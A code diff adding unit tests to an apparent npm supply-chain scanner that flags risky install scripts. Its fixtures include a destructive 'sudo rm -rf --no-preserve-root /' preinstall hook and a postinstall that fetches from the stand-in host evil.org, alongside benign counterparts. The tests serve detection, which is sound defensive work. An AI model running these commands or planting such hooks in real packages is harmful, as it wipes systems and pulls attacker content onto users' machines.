@@ -73,6 +73,67 @@ class TestInlineLifecycleCommandAnalysis:
         assert "install_script_network" not in ev_ids
         assert "install_script_executes" not in ev_ids
 
+    def test_narrowed_rm_rf_benign_build_clean_not_flagged(self):
+        old_rel = _make_release(pkg_json={"name": "pkg-clean", "version": "1.0.0"})
+        new_rel = _make_release(
+            pkg_json={
+                "name": "pkg-clean",
+                "version": "1.0.1",
+                "scripts": {
+                    "postinstall": "rm -rf dist && mkdir -p dist && npm run build-cjs && tsc",
+                },
+            }
+        )
+        ev = compare_releases(old_rel, new_rel)
+        ev_ids = {e.id for e in ev}
+        assert "install_script_added" in ev_ids
+        assert "install_script_executes" not in ev_ids
+
+    def test_narrowed_rm_rf_dangerous_targets_flagged(self):
+        old_rel = _make_release(pkg_json={"name": "pkg-danger", "version": "1.0.0"})
+        new_rel = _make_release(
+            pkg_json={
+                "name": "pkg-danger",
+                "version": "1.0.1",
+                "scripts": {
+                    "preinstall": "sudo rm -rf --no-preserve-root /",
+                },
+            }
+        )
+        ev = compare_releases(old_rel, new_rel)
+        ev_ids = {e.id for e in ev}
+        assert "install_script_executes" in ev_ids
+
+    def test_narrowed_fetch_benign_git_fetch_not_flagged(self):
+        old_rel = _make_release(pkg_json={"name": "pkg-fetch", "version": "1.0.0"})
+        new_rel = _make_release(
+            pkg_json={
+                "name": "pkg-fetch",
+                "version": "1.0.1",
+                "scripts": {
+                    "prepare": "git fetch --tags && node scripts/fetch-assets.js",
+                },
+            }
+        )
+        ev = compare_releases(old_rel, new_rel)
+        ev_ids = {e.id for e in ev}
+        assert "install_script_network" not in ev_ids
+
+    def test_narrowed_fetch_network_call_flagged(self):
+        old_rel = _make_release(pkg_json={"name": "pkg-fetch2", "version": "1.0.0"})
+        new_rel = _make_release(
+            pkg_json={
+                "name": "pkg-fetch2",
+                "version": "1.0.1",
+                "scripts": {
+                    "postinstall": "node -e \"fetch('https://evil.org/drop').then(r=>r.text())\"",
+                },
+            }
+        )
+        ev = compare_releases(old_rel, new_rel)
+        ev_ids = {e.id for e in ev}
+        assert "install_script_network" in ev_ids
+
 
 class TestCIWorkflowInjection:
     """Part 2b: CI workflow injection."""
